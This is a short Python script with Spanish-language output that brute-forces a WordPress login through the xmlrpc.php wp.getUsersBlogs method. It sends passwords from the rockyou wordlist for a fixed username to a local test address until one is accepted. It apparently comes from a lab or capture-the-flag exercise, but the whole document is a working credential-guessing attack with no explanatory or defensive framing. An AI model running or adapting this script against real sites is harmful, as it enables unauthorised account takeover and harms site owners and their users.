#!/usr/bin/python3

import sys
import time
import requests

# Colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
BLUE = "\033[1;34m"
PURPLE = "\033[1;35m"
RESET = "\033[0m"

def xmlPayload(password):

    xmlBody = f"""
    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall>
    <methodName>wp.getUsersBlogs</methodName>
    <params>
    <param><value>HackCrox</value></param>
    <param><value>{password}</value></param>
    </params>
    </methodCall>
    """

    request = requests.post('http://127.0.0.1:31337/xmlrpc.php', data=xmlBody)

    return request.text

def bruteForce():

    print(f"\n{BLUE}[+]{RESET} Iniciando ataque...")

    while True:    
        with open("/usr/share/wordlists/rockyou.txt", "r") as wordlists:
            for password in wordlists:
                response = (xmlPayload(password.strip()))

                if "Incorrect username or password." not in response:
                    print(f"\n\t{GREEN}[OK]{RESET} Contraseña encontrada: {GREEN}{password.strip()}{RESET}")
                    print(f"\n{PURPLE}[+]{RESET} Ataque exitoso finalizado B)\n")
                    sys.exit(0)
                    break


def main():
    bruteForce()        

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{RED}\n\n[!] Saliendo...\n{RESET}")
        sys.exit(1)

